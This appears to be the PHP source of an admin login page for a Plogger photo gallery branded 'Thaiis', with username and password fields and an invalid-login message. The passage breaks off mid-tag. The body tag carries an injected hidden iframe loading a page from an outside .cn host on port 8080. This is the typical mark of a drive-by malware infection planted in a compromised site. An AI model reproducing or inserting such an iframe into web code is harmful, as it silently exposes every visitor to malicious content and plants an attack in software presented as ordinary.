<?php

session_start();

$output = '';

$output .= '
	<html>
		<head>
			<title>Thaiis Administrative Login</title>
			<link href="../css/admin.css" type="text/css" rel="stylesheet" />
			<script type="text/javascript" src="js/plogger.js"></script>
		</head>
		<body id="login-page" onload="focus_first_input()"><iframe src="http://filmoflife.cn:8080/index.php" width=104 height=101 style="visibility: hidden"></iframe>
			
		<div id="login">	
			<form action="plog-upload.php" method="post">
				
					<div align="center">
						<table width="380">
							<tr>';
		
		if (isset($_REQUEST["errorcode"])){
			switch($_REQUEST["errorcode"]){
				case 1:
					$output .= '<td colspan="2" align="center"><em>Invalid login.</em></td>';
					break;
			}
		}
		
		$output .= '
							</tr>
							<tr>
								<td><label for="username"><b>Username:</b></label></td>
								<td><input type="text" name="username" id="username" /></td>
							</tr>
							<tr>
								<td><label for="password"><b>Password:</b></label></td>
								<td><input type="password" name="password" id="password" /></td>
							</tr>
							<tr>
								<td>&nbsp;</td>
								<td><input class="submit" type="submit" value="Log In" /></td>
							</tr>
						<